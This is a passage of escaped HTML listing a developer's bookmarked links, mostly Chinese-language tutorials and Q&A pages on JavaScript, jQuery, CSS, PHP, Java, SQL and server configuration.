sunpeiyumail 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/sunpeiyumail/article/details/7665668\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/sunpeiyumail/article/details/7665668</a></p>\n<p>Apache AXIS 2 - SOAP Web Service 實作教學 (即時天氣預報) - Soul &amp; Shell Blog<br><a href=\"https://blog.toright.com/posts/268/apache-axis-2-soap-web-service-%E5%AF%A6%E4%BD%9C%E6%95%99%E5%AD%B8-%E5%8D%B3%E6%99%82%E5%A4%A9%E6%B0%A3%E9%A0%90%E5%A0%B1.html\" target=\"_blank\" rel=\"noopener\">https://blog.toright.com/posts/268/apache-axis-2-soap-web-service-%E5%AF%A6%E4%BD%9C%E6%95%99%E5%AD%B8-%E5%8D%B3%E6%99%82%E5%A4%A9%E6%B0%A3%E9%A0%90%E5%A0%B1.html</a></p>\n<p>request.getParameter() 、 request.getInputStream()和 request.getReader() 使用体会 - clam_clam 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/clam_clam/article/details/6570539\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/clam_clam/article/details/6570539</a></p>\n<p>建立 Web Service 程式(asmx 檔) - Eason’s 教學平台<br><a href=\"https://sites.google.com/site/easonsjiaoxuepingtai/asp-net-web-service/jian-liweb-service-cheng-shi-asmx-dang\" target=\"_blank\" rel=\"noopener\">https://sites.google.com/site/easonsjiaoxuepingtai/asp-net-web-service/jian-liweb-service-cheng-shi-asmx-dang</a></p>\n<p>yilin 的程式日記: [Java] 在 Java 程式中呼叫 .Net 的 Web Service<br><a href=\"http://yilinliu.blogspot.com/2010/07/java-java-net-web-service.html\" target=\"_blank\" rel=\"noopener\">http://yilinliu.blogspot.com/2010/07/java-java-net-web-service.html</a></p>\n<p>利用 Eclipse 簡單建立 AXIS 的 WebService @ 大笨鳥的私房菜 :: 痞客邦 PIXNET ::<br><a href=\"http://camuschou.pixnet.net/blog/post/13993595-%E5%88%A9%E7%94%A8-eclipse-%E7%B0%A1%E5%96%AE%E5%BB%BA%E7%AB%8B-axis-%E7%9A%84-webservice\" target=\"_blank\" rel=\"noopener\">http://camuschou.pixnet.net/blog/post/13993595-%E5%88%A9%E7%94%A8-eclipse-%E7%B0%A1%E5%96%AE%E5%BB%BA%E7%AB%8B-axis-%E7%9A%84-webservice</a></p>\n<p>[筆記] Web Service 概述 | m@rcus 學習筆記 - 點部落<br><a href=\"https://dotblogs.com.tw/marcus116/2011/08/28/34524\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/marcus116/2011/08/28/34524</a></p>\n<p>[筆記] 了解 function borrowing 和 function currying ─ bind(), call(), apply() 的應用 | PJCHENder 愛分享<br><a href=\"https://pjchender.blogspot.com/2016/06/function-borrowingfunction-currying.html\" target=\"_blank\" rel=\"noopener\">https://pjchender.blogspot.com/2016/06/function-borrowingfunction-currying.html</a></p>\n<p>超強 1000 個 jquery 插件！（連載中。。。。最近更新 2011 年 01 月 25 日）|精彩博文 - 博搜網<br><a href=\"http://cocboso.com/subject/about/16657.html\" target=\"_blank\" rel=\"noopener\">http://cocboso.com/subject/about/16657.html</a></p>\n<p>純 CSS 的下拉式選單 - Astral web 歐斯瑞公司<br><a href=\"http://www.astralweb.com.tw/pure-css-drop-down-menu/\" target=\"_blank\" rel=\"noopener\">http://www.astralweb.com.tw/pure-css-drop-down-menu/</a></p>\n<p>XYZ 的筆記本: PHP 讀取 BIG5 編碼的 CSV 檔<br><a href=\"http://xyz.cinc.biz/2013/12/php-fgetcsv-backslash.html\" target=\"_blank\" rel=\"noopener\">http://xyz.cinc.biz/2013/12/php-fgetcsv-backslash.html</a></p>\n<p>頁面載入發生問題<br><a href=\"http://inder.com.tw/ios-architecture-patterns-mvc-mvp-mvvm-viper/\" target=\"_blank\" rel=\"noopener\">http://inder.com.tw/ios-architecture-patterns-mvc-mvp-mvvm-viper/</a></p>\n<p>[VueJS] VueJS 小小心得<br><a href=\"https://blog.hinablue.me/js-vue-js-xiao-xiao-xin-de/\" target=\"_blank\" rel=\"noopener\">https://blog.hinablue.me/js-vue-js-xiao-xiao-xin-de/</a></p>\n<p>jQuery UI Menu Example<br><a href=\"https://codepen.io/ellomumsy/pen/jenzG\" target=\"_blank\" rel=\"noopener\">https://codepen.io/ellomumsy/pen/jenzG</a></p>\n<p>PHP Array Beautifier | phillihp’s tech blog – Phil’s Tech Blog<br><a href=\"http://phillihp.com/toolz/php-array-beautifier/\" target=\"_blank\" rel=\"noopener\">http://phillihp.com/toolz/php-array-beautifier/</a></p>\n<p>NW.js &amp; Electron Compared - TangibleJS<br><a href=\"http://tangiblejs.com/posts/nw-js-electron-compared\" target=\"_blank\" rel=\"noopener\">http://tangiblejs.com/posts/nw-js-electron-compared</a></p>\n<p>Charles Web Debugging Proxy • HTTP Monitor / HTTP Proxy / HTTPS &amp; SSL Proxy / Reverse Proxy<br><a href=\"https://www.charlesproxy.com/\" target=\"_blank\" rel=\"noopener\">https://www.charlesproxy.com/</a></p>\n<p>Ray Lee : [JQuery] find() 與 filter() 用法區別<br><a href=\"http://raylee0616.blogspot.tw/2013/09/jquery-find-chidren-filter.html\" target=\"_blank\" rel=\"noopener\">http://raylee0616.blogspot.tw/2013/09/jquery-find-chidren-filter.html</a></p>\n<p>如何形象地解释 JavaScript 中 map、foreach、reduce 间的区别？ - 知乎<br><a href=\"https://www.zhihu.com/question/24927450\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/24927450</a></p>\n<p>reduce | underscorejs 学习参考<br><a href=\"https://niec-fe.gitbooks.io/underscorejs/content/collections/reduce.html\" target=\"_blank\" rel=\"noopener\">https://niec-fe.gitbooks.io/underscorejs/content/collections/reduce.html</a></p>\n<p>javascript - Jquery and Jslint - ‘ was used before it was defined - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/18251388/jquery-and-jslint-was-used-before-it-was-defined\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/18251388/jquery-and-jslint-was-used-before-it-was-defined</a></p>\n<p>JSHint 选项列表 | bubkoo<br><a href=\"http://bubkoo.com/2014/02/22/JSHint-options/\" target=\"_blank\" rel=\"noopener\">http://bubkoo.com/2014/02/22/JSHint-options/</a></p>\n<p>頁面載入發生問題<br><a href=\"http://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/\" target=\"_blank\" rel=\"noopener\">http://www.zhangxinxu.com/wordpress/2012/04/inline-block-space-remove-%E5%8E%BB%E9%99%A4%E9%97%B4%E8%B7%9D/</a></p>\n<p>inline-block、BFC、边距合并<br><a href=\"http://blog.leanote.com/post/605988809@qq.com/inline-block%E3%80%81BFC%E3%80%81%E8%BE%B9%E8%B7%9D%E5%90%88%E5%B9%B6\" target=\"_blank\" rel=\"noopener\">http://blog.leanote.com/post/605988809@qq.com/inline-block%E3%80%81BFC%E3%80%81%E8%BE%B9%E8%B7%9D%E5%90%88%E5%B9%B6</a></p>\n<p>理解 CSS 中 BFC_CSS, BFC 教程_w3cplus<br><a href=\"http://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html\" target=\"_blank\" rel=\"noopener\">http://www.w3cplus.com/css/understanding-block-formatting-contexts-in-css.html</a></p>\n<p>Pass a variable to JQuery UI dialog - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/14898765/pass-a-variable-to-jquery-ui-dialog\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/14898765/pass-a-variable-to-jquery-ui-dialog</a></p>\n<p>Page not found · GitHub<br><a href=\"https://gist.github.com/videde/14436c9662769df8c38e\" target=\"_blank\" rel=\"noopener\">https://gist.github.com/videde/14436c9662769df8c38e</a></p>\n<p>Free Web Proxy<br><a href=\"https://whoer.net/webproxy\" target=\"_blank\" rel=\"noopener\">https://whoer.net/webproxy</a></p>\n<p><a href=\"http://blog.csdn.net/violetjack0808/article/details/51508877\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/violetjack0808/article/details/51508877</a><br><a href=\"http://blog.csdn.net/violetjack0808/article/details/51508877\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/violetjack0808/article/details/51508877</a></p>\n<p>Sublime Text 使用教程（Windows 系统下 Sublime Text3）<br><a href=\"http://front-end.leanote.com/post/Sublime-Text\" target=\"_blank\" rel=\"noopener\">http://front-end.leanote.com/post/Sublime-Text</a></p>\n<p>本文介绍 Android 及 IPhone 手机上如何进行网络数据抓包，比如我们想抓某个应用(微博、微信、墨迹天气)的网络通信请求就可以利用这个方法。<br><a href=\"http://www.trinea.cn/android/android-network-sniffer/\" target=\"_blank\" rel=\"noopener\">http://www.trinea.cn/android/android-network-sniffer/</a></p>\n<p>in operator - JavaScript | MDN<br><a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in\" target=\"_blank\" rel=\"noopener\">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/in</a></p>\n<p>css - Multiple attribute jQuery selector not working in IE8 - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/25200455/multiple-attribute-jquery-selector-not-working-in-ie8\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/25200455/multiple-attribute-jquery-selector-not-working-in-ie8</a></p>\n<p>jQuery 面试题 | 前端工程师手册<br><a href=\"https://leohxj.gitbooks.io/front-end-database/content/interview/interview-exercises-with-jquery.html\" target=\"_blank\" rel=\"noopener\">https://leohxj.gitbooks.io/front-end-database/content/interview/interview-exercises-with-jquery.html</a></p>\n<p>頁面載入發生問題<br><a href=\"http://eghrum.cgjgxqznxkgj.lgtkz.se1.gsr.awhoer.net/post-2011-10-25-jquery-data-attr-notes.aspx\" target=\"_blank\" rel=\"noopener\">http://eghrum.cgjgxqznxkgj.lgtkz.se1.gsr.awhoer.net/post-2011-10-25-jquery-data-attr-notes.aspx</a></p>\n<p>介紹 | 前端工程师手册<br><a href=\"https://leohxj.gitbooks.io/front-end-database/content/\" target=\"_blank\" rel=\"noopener\">https://leohxj.gitbooks.io/front-end-database/content/</a></p>\n<p>10 個 JS、jQuery 效能調校方法 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天<br><a href=\"http://ithelp.ithome.com.tw/articles/10091980\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10091980</a></p>\n<p>jquery - How to break line in jQueryUI tooltip - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/13066909/how-to-break-line-in-jqueryui-tooltip\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/13066909/how-to-break-line-in-jqueryui-tooltip</a></p>\n<p>css - How do I make an html link look like a button? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/710089/how-do-i-make-an-html-link-look-like-a-button\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/710089/how-do-i-make-an-html-link-look-like-a-button</a></p>\n<p>[轉][javascript] JS 中如何判断－null @ 碎碎念 :: 隨意窩 Xuite 日誌<br><a href=\"http://blog.xuite.net/dizzy03/murmur/46782052-%5B%E8%BD%89%5D%5BJavascript%5D+JS+%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%EF%BC%8Dnull\" target=\"_blank\" rel=\"noopener\">http://blog.xuite.net/dizzy03/murmur/46782052-%5B%E8%BD%89%5D%5BJavascript%5D+JS+%E4%B8%AD%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%EF%BC%8Dnull</a></p>\n<p>idiomatic.js/readme.md at master · rwaldron/idiomatic.js<br><a href=\"https://github.com/rwaldron/idiomatic.js/blob/master/translations/zh_TW/readme.md\" target=\"_blank\" rel=\"noopener\">https://github.com/rwaldron/idiomatic.js/blob/master/translations/zh_TW/readme.md</a></p>\n<p>The Problems of JSHint (JSHint 的問題) | 格物致知<br><a href=\"https://amobiz.github.io/2015/12/20/problems-of-jshint/\" target=\"_blank\" rel=\"noopener\">https://amobiz.github.io/2015/12/20/problems-of-jshint/</a></p>\n<p>用 grunt 搭建自動化的 web 前端開發環境-完整教程 - 壹讀<br><a href=\"https://read01.com/GJNPLB.html\" target=\"_blank\" rel=\"noopener\">https://read01.com/GJNPLB.html</a></p>\n<p>[Node.js]很好用的 package.json @ 賽拉維的秋天 :: 痞客邦 PIXNET ::<br><a href=\"http://cire.pixnet.net/blog/post/36601110-%5Bnode.js%5D%E5%BE%88%E5%A5%BD%E7%94%A8%E7%9A%84package.json\" target=\"_blank\" rel=\"noopener\">http://cire.pixnet.net/blog/post/36601110-%5Bnode.js%5D%E5%BE%88%E5%A5%BD%E7%94%A8%E7%9A%84package.json</a></p>\n<p>Android Intent&amp;Bundle 傳遞資料(包含傳遞自定義物件) @ Mazs’s Notes :: 痞客邦 PIXNET ::<br><a href=\"http://cookiesp.pixnet.net/blog/post/84190702-android-intent%26bundle-%E5%82%B3%E9%81%9E%E8%B3%87%E6%96%99\" target=\"_blank\" rel=\"noopener\">http://cookiesp.pixnet.net/blog/post/84190702-android-intent%26bundle-%E5%82%B3%E9%81%9E%E8%B3%87%E6%96%99</a>(%E5%8C%85%E5%90%AB%E5%82%B3%E9%81%9E%E8%87%AA%E5%AE%9A%E7%BE%A9%E7%89%A9</p>\n<p>Android Activity 生命周期研究记录 - 不单单是 Android 研发 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/song314/article/details/20706963\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/song314/article/details/20706963</a></p>\n<p>java.util.Properties 的應用：setProperty, getProperty, storeToXML, loadFromXML @ 符碼記憶<br><a href=\"http://www.ewdna.com/2008/12/javautilpropertiessetproperty.html\" target=\"_blank\" rel=\"noopener\">http://www.ewdna.com/2008/12/javautilpropertiessetproperty.html</a></p>\n<p>NodeSchool<br><a href=\"https://nodeschool.io/\" target=\"_blank\" rel=\"noopener\">https://nodeschool.io/</a></p>\n<p>about:blank<br>about:blank</p>\n<p>筆記本而已: PHP 中 htmlentities 跟 htmlspecialchars 的區別<br><a href=\"http://lifeiskuso.blogspot.com/2009/08/php-htmlentities-htmlspecialchars.html\" target=\"_blank\" rel=\"noopener\">http://lifeiskuso.blogspot.com/2009/08/php-htmlentities-htmlspecialchars.html</a></p>\n<p>不允許存取<br><a href=\"https://www.blogger.com/blogin.g?blogspotURL=http://xr22.blogspot.tw/2012/04/twig-template-engine-php.html\" target=\"_blank\" rel=\"noopener\">https://www.blogger.com/blogin.g?blogspotURL=http://xr22.blogspot.tw/2012/04/twig-template-engine-php.html</a></p>\n<p>安装 · Twig-cn<br><a href=\"https://lupuxyz.gitbooks.io/twig-cn/content/installation.html\" target=\"_blank\" rel=\"noopener\">https://lupuxyz.gitbooks.io/twig-cn/content/installation.html</a></p>\n<p>PSR-2 PHP Coding Style | 點燈坊<br><a href=\"http://oomusou.io/php/php-psr2/\" target=\"_blank\" rel=\"noopener\">http://oomusou.io/php/php-psr2/</a></p>\n<p>Find element in array | Level Up Lunch<br><a href=\"https://www.leveluplunch.com/java/examples/find-element-in-array/\" target=\"_blank\" rel=\"noopener\">https://www.leveluplunch.com/java/examples/find-element-in-array/</a></p>\n<p>IBM Knowledge Center<br><a href=\"https://www.ibm.com/support/knowledgecenter/SSEPGG_9.7.0/com.ibm.swg.im.dbclient.php.doc/doc/t0023135.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/support/knowledgecenter/SSEPGG_9.7.0/com.ibm.swg.im.dbclient.php.doc/doc/t0023135.html</a></p>\n<p>about:blank<br>about:blank</p>\n<p>頁面載入發生問題<br><a href=\"http://lavasoft.blog.51cto.com/62575/12416/\" target=\"_blank\" rel=\"noopener\">http://lavasoft.blog.51cto.com/62575/12416/</a></p>\n<p>Docker daemon 因為網路設定而無法啟動 « My Codetub<br><a href=\"http://mycodetub.logdown.com/posts/798962-docker-daemon-because-the-network-is-set-to-start\" target=\"_blank\" rel=\"noopener\">http://mycodetub.logdown.com/posts/798962-docker-daemon-because-the-network-is-set-to-start</a></p>\n<p>SQL JOIN 語法順序與效能之推論 | InspireGate<br><a href=\"http://inspiregate.windspeaker.co/post/3816-sql-join-syntax-and-performance-of-inference-in-order\" target=\"_blank\" rel=\"noopener\">http://inspiregate.windspeaker.co/post/3816-sql-join-syntax-and-performance-of-inference-in-order</a></p>\n<p>Git · GitBook<br><a href=\"https://www.gitbook.com/book/zlargon/git-tutorial/details\" target=\"_blank\" rel=\"noopener\">https://www.gitbook.com/book/zlargon/git-tutorial/details</a></p>\n<p>JDK 中 ArrayList、HashMap 和 HashSet 的 equals 方法源码分析 - bigconvience 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/bigconvience/article/details/45972289\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/bigconvience/article/details/45972289</a></p>\n<p>DB 著魔錄: DB2 中文問題<br><a href=\"http://dbmagicon.blogspot.com/2008/07/db2.html\" target=\"_blank\" rel=\"noopener\">http://dbmagicon.blogspot.com/2008/07/db2.html</a></p>\n<p>sql - Querying oracle clob column - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/18250014/querying-oracle-clob-column\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/18250014/querying-oracle-clob-column</a></p>\n<p>JavaScript 事件冒泡和事件委托 « PureWeber – 纯粹互联网<br><a href=\"https://www.pureweber.com/article/event-delegation/\" target=\"_blank\" rel=\"noopener\">https://www.pureweber.com/article/event-delegation/</a></p>\n<p>SQL Like with a subquery - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/17177779/sql-like-with-a-subquery\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/17177779/sql-like-with-a-subquery</a></p>\n<p>Python 爬蟲新手筆記 - Pala.tw<br><a href=\"http://pala.tw/python-web-crawler/\" target=\"_blank\" rel=\"noopener\">http://pala.tw/python-web-crawler/</a></p>\n<p>Python 用 WMI 模块获取 windowns 系统信息 - 王伟 - 51CTO 技术博客<br><a href=\"http://wangwei007.blog.51cto.com/68019/1158075\" target=\"_blank\" rel=\"noopener\">http://wangwei007.blog.51cto.com/68019/1158075</a></p>\n<p>Python work with WIM 列出目前電腦的 Process - Python<em>NoteBook<br><a href=\"http://wiki.alarmchang.com/index.php?title=Python_work_with_WIM\" target=\"_blank\" rel=\"noopener\">http://wiki.alarmchang.com/index.php?title=Python_work_with_WIM</a></em>%E5%88%97%E5%87%BA%E7%9B%AE%E5%89%8D%E9%9B%BB%E8%85%A6%E7%9A%84_Process</p>\n<p>首頁 - ReactJS 新聞電子報<br><a href=\"https://reactjs-tw.top/\" target=\"_blank\" rel=\"noopener\">https://reactjs-tw.top/</a></p>\n<p>如何相互转换逗号分隔的字符串和 List (Java 程序员日记 2015/03/06) - jicahoo 的专栏 - 博客频道 - CSDN.NET<br><a href=\"http://blog.csdn.net/jicahoo/article/details/44105109\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/jicahoo/article/details/44105109</a></p>\n<p>AllenLin 的部落格: [Java] ArrayList 轉 Array<br><a href=\"http://sd810.blogspot.com/2011/03/javaarraylistarray.html\" target=\"_blank\" rel=\"noopener\">http://sd810.blogspot.com/2011/03/javaarraylistarray.html</a></p>\n<p>javascript - ‘console’ is undefined error for Internet Explorer - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/3326650/console-is-undefined-error-for-internet-explorer\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/3326650/console-is-undefined-error-for-internet-explorer</a></p>\n<p>Tomcat 的 JVM 設置和連接數設置 @ 資訊園 :: 痞客邦 PIXNET ::<br><a href=\"http://fecbob.pixnet.net/blog/post/38257503-tomcat%E7%9A%84jvm%E8%A8%AD%E7%BD%AE%E5%92%8C%E9%80%A3%E6%8E%A5%E6%95%B8%E8%A8%AD%E7%BD%AE\" target=\"_blank\" rel=\"noopener\">http://fecbob.pixnet.net/blog/post/38257503-tomcat%E7%9A%84jvm%E8%A8%AD%E7%BD%AE%E5%92%8C%E9%80%A3%E6%8E%A5%E6%95%B8%E8%A8%AD%E7%BD%AE</a></p>\n<p>跳躍的海豚: Apache Tomcat 6 的記憶體配置 (效能調整)<br><a href=\"http://fly-dolphin.blogspot.com/2011/10/apache-tomcat-6.html\" target=\"_blank\" rel=\"noopener\">http://fly-dolphin.blogspot.com/2011/10/apache-tomcat-6.html</a></p>\n<p>HTML FORM elements 與 submit | 阿沙布魯 - 點部落<br><a href=\"https://dotblogs.com.tw/brooke/2014/07/12/145918\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/brooke/2014/07/12/145918</a></p>\n<p>Remote Desktop Organizer (RDO) 1.4.7 免安裝版 - 取代微軟遠端桌面 - 阿榮福利味 - 免費軟體下載<br><a href=\"http://www.azofreeware.com/2010/06/remote-desktop-organizer-142.html\" target=\"_blank\" rel=\"noopener\">http://www.azofreeware.com/2010/06/remote-desktop-organizer-142.html</a></p>\n<p>在 Postman 中使用不受信任的 SSL 证书（转） - 平和的心 - 博客园<br><a href=\"http://www.cnblogs.com/ajianbeyourself/p/3899729.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/ajianbeyourself/p/3899729.html</a></p>\n<p>[討論] FineReport 與 iReport 的幾大功能對比 | 列印 - 第 1 頁 | T17 討論區 - 一起分享好東西<br><a href=\"http://t17.techbang.com/topics/35119-finereport-in-contrast-to-several-functions-of-ireport?mode=print&amp;page=1\" target=\"_blank\" rel=\"noopener\">http://t17.techbang.com/topics/35119-finereport-in-contrast-to-several-functions-of-ireport?mode=print&amp;page=1</a></p>\n<p>[Windows]忘記或遺失 Windows Administrator 帳號時的搶救方式 | 五餅二魚工作室 - 點部落<br><a href=\"https://dotblogs.com.tw/jamesfu/2014/10/21/lostadministratorpassword\" target=\"_blank\" rel=\"noopener\">https://dotblogs.com.tw/jamesfu/2014/10/21/lostadministratorpassword</a></p>\n<p>E-Office 學園 • 檢視主題 - [98] Web 應用程式中文編碼問題<br><a href=\"http://eoffice.im.fju.edu.tw/phpbb/viewtopic.php?p=29212\" target=\"_blank\" rel=\"noopener\">http://eoffice.im.fju.edu.tw/phpbb/viewtopic.php?p=29212</a></p>\n<p>SEO 不是只靠關鍵字！網站的 SEO 診療師「球來就打」，一眼看穿五大電商網站 SEO 優化狀況 | T 客邦 - 我只推薦好東西<br><a href=\"http://www.techbang.com/posts/47588-ball-hits\" target=\"_blank\" rel=\"noopener\">http://www.techbang.com/posts/47588-ball-hits</a></p>\n<p>頁面載入發生問題<br><a href=\"http://www.tomytime.com/archives/296/\" target=\"_blank\" rel=\"noopener\">http://www.tomytime.com/archives/296/</a></p>\n<p>LeetCode Online Judge<br><a href=\"https://leetcode.com/\" target=\"_blank\" rel=\"noopener\">https://leetcode.com/</a></p>\n<p>SQL Server 2008 匯出 excel 檔 | FAQ Book<br><a href=\"http://blog.faq-book.com/?p=492\" target=\"_blank\" rel=\"noopener\">http://blog.faq-book.com/?p=492</a></p>\n<p>假面俱樂部: [WebSphere 6] About UTF-8 的設定<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:rFeRjw9R9CAJ:ultrapan.blogspot.com/2010/09/websphere-6-about-utf-8.html+&amp;cd=21&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:rFeRjw9R9CAJ:ultrapan.blogspot.com/2010/09/websphere-6-about-utf-8.html+&amp;cd=21&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw</a></p>\n<p>IE 濾鏡特效 | 摩刻部落<br><a href=\"https://www.moke.tw/wordpress/IEfilterTest.htm\" target=\"_blank\" rel=\"noopener\">https://www.moke.tw/wordpress/IEfilterTest.htm</a></p>\n<p>CSS3 與濾境(10)－物件旋轉 – 摩刻部落<br><a href=\"http://www.moke.tw/wordpress/computer/web/295#Flip\" target=\"_blank\" rel=\"noopener\">http://www.moke.tw/wordpress/computer/web/295#Flip</a></p>\n<p>JWorld@TW Java 論壇 - JSTL1.1 中的 JavaBean 取值問題<br><a href=\"https://www.javaworld.com.tw/jute/post/view?bid=6&amp;id=44914&amp;sty=1&amp;tpg=2&amp;age=0\" target=\"_blank\" rel=\"noopener\">https://www.javaworld.com.tw/jute/post/view?bid=6&amp;id=44914&amp;sty=1&amp;tpg=2&amp;age=0</a></p>\n<p>left outer inner join - Google 搜尋<br><a href=\"https://www.google.com.tw/search?q=left+outer+inner+join&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=0ahUKEwi3r5zY997QAhWMi5QKHSbdD8oQ_AUICCgB&amp;biw=1280&amp;bih=889#imgrc=vbpgNfoptCySiM%3A\" target=\"_blank\" rel=\"noopener\">https://www.google.com.tw/search?q=left+outer+inner+join&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=0ahUKEwi3r5zY997QAhWMi5QKHSbdD8oQ_AUICCgB&amp;biw=1280&amp;bih=889#imgrc=vbpgNfoptCySiM%3A</a></p>\n<p>判斷字串裡是否有中文字 - kait - BlogJava<br><a href=\"http://www.blogjava.net/kait/archive/2011/03/10/346102.html\" target=\"_blank\" rel=\"noopener\">http://www.blogjava.net/kait/archive/2011/03/10/346102.html</a></p>\n<p>program:javascript:setattribute 的問題 [MasterDragon 技術備忘錄]<br><a href=\"http://lang.idv.tw/doku.php/program/javascript/setattribute%E7%9A%84%E5%95%8F%E9%A1%8C\" target=\"_blank\" rel=\"noopener\">http://lang.idv.tw/doku.php/program/javascript/setattribute%E7%9A%84%E5%95%8F%E9%A1%8C</a></p>\n<p>Javascript JSON comparison/diff? - Stack Overflow<br><a href=\"http://stackoverflow.com/questions/10357830/javascript-json-comparison-diff\" target=\"_blank\" rel=\"noopener\">http://stackoverflow.com/questions/10357830/javascript-json-comparison-diff</a></p>\n<p>SQL Fiddle<br><a href=\"http://sqlfiddle.com/#!2/84e0a/52\" target=\"_blank\" rel=\"noopener\">http://sqlfiddle.com/#!2/84e0a/52</a></p>\n<p>where，group by 和 having 的使用时的最大区别 - 调试易<br><a href=\"http://www.debugease.com/mssqlbasic/800884.html\" target=\"_blank\" rel=\"noopener\">http://www.debugease.com/mssqlbasic/800884.html</a></p>\n<p>Error 404 (Not Found)!!1<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:Un6BxT4LMnYJ:starshine.pixnet.net/blog/\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:Un6BxT4LMnYJ:starshine.pixnet.net/blog/</a><br>post/30402669-%255B%25E9%259B%259C%25E8%25A8%2598%255D-ultravnc-%25E9%259C%2580%25E8%25A6%2581%25E4%25B8%258D%25E5%2581%259C%25E9%2587%258D%25E6%2596%25B0%25E6%2595%25B4%25E7%2590%2586(refresh)%25E7%259A%2584%25E8%25A7%25A3%25E6%25B1%25BA+&amp;cd=24&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw<br>使用 VLOOKUP、INDEX 或 MATCH 尋找值 - Excel<br><a href=\"https://support.office.com/zh-tw/article/%E4%BD%BF%E7%94%A8-VLOOKUP%E3%80%81INDEX-%E6%88%96-MATCH-%E5%B0%8B%E6%89%BE%E5%80%BC-7144ef3f-e322-4f95-9e96-f1d743270438\" target=\"_blank\" rel=\"noopener\">https://support.office.com/zh-tw/article/%E4%BD%BF%E7%94%A8-VLOOKUP%E3%80%81INDEX-%E6%88%96-MATCH-%E5%B0%8B%E6%89%BE%E5%80%BC-7144ef3f-e322-4f95-9e96-f1d743270438</a></p>\n<p>php - 解決 Allowed memory size of 134217728 bytes exhausted 問題 @ Life Is Struggle :: 隨意窩 Xuite 日誌<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:trFLi92xPOMJ:blog.xuite.net/choubee/\" target=\"_blank\" rel=\"noopener\">http://webcache.googleusercontent.com/search?q=cache:trFLi92xPOMJ:blog.xuite.net/choubee/</a><br>blog/46452700-php%2B-%2B%25E8%25A7%25A3%25E6%25B1%25BA%2BAllowed%2Bmemory%2Bsize%2Bof%2B134217728%2Bbytes%2Bexhausted%2B%25E5%2595%258F%25E9%25A1%258C+&amp;cd=1&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw<br>用 python 抓網頁 data,及做圖表之五：抓網頁內建庫 urllib 及第三方庫 BeautifulSoup 的使用 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天<br><a href=\"http://ithelp.ithome.com.tw/articles/10127973\" target=\"_blank\" rel=\"noopener\">http://ithelp.ithome.com.tw/articles/10127973</a></p>\n<p>解决 IE8 不支持数组的 indexOf 方法 - JustRun - 博客园<br><a href=\"http://www.cnblogs.com/JustRun1983/archive/2013/04/02/2996650.html\" target=\"_blank\" rel=\"noopener\">http://www.cnblogs.com/JustRun1983/archive/2013/04/02/2996650.html</a></p>\n<p>Use jQuery’s $.closest() vs $.parents() — SitePoint<br><a href=\"https://webcache.googleusercontent.com/search?q=cache:j4_aJlq-TOUJ:https://www.sitepoint.com/jquerys-closest-parents/+&amp;cd=3&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw\" target=\"_blank\" rel=\"noopener\">https://webcache.googleusercontent.com/search?q=cache:j4_aJlq-TOUJ:https://www.sitepoint.com/jquerys-closest-parents/+&amp;cd=3&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw</a></p>\n<p>SQL 2012 新功能 OFFSET-FETCH @ Louis 學習筆記 :: 痞客邦 PIXNET ::<br><a href=\"http://webcache.googleusercontent.com/search?q=cache:-kuGRcOM_IoJ:louis176127.pixnet.net/blog/\" target=\"_blank\" 